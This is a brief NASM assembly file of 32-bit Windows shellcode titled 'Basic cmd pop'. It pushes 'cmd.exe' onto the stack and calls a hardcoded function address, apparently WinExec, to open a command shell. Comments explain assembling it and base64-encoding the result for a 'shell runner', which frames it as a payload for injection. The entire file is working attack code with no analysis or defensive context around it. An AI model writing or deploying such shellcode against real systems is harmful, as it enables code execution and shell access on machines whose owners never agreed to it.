; Name: Basic cmd pop
; Author: RomanRII
; Date: 07/13/21
; nasm -f bin calc.asm -o Bins/cmd.bin
; cat Bins/cmd.bin | base64 & copy that into a b64 shell runner

BITS 32
section .text
global _start
_start:
 xor eax, eax
 push eax
 push ".exe"
 push "cmd"
 mov eax, esp
 push 1
 push eax
 mov ebx, 0x775dcd30
 call ebx
